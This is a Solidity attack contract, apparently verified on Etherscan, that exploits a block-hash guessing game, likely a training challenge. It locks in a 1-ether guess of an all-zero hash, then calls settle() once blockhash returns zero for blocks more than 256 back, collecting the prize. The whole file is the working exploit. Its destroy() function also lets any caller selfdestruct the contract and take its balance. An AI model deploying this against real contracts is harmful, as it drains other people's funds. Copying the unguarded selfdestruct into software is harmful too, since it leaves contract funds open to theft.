/**
 *Submitted for verification at Etherscan.io on 2021-10-28
*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;

contract PredictTheFutur{
    
    bytes32 hashOfBlock;
    bytes32 myAnswer = 0x0000000000000000000000000000000000000000000000000000000000000000;
    
    receive() payable external {}
    
    function pastHash(uint _blockNumer) public {
        hashOfBlock = blockhash(_blockNumer); 
    }
    
    function getHashOfBlock() public view returns(bytes32) {
        return(hashOfBlock);
    }
    
    function lockIn(address payable _contract) payable public {
        require(msg.value == 1 ether);
        (bool success,) = _contract.call{value : msg.value}(
            abi.encodeWithSignature("lockInGuess(bytes32)", myAnswer)
        );
        require(success, "lockIn crash");    
    }
    
    function attack(address payable _contract) public {
        (bool success,) = _contract.call(
            abi.encodeWithSignature("settle()")    
        );
        require(success, "attack failed");
    }
    
    function destroy() public {
        selfdestruct(payable(msg.sender));
    }
}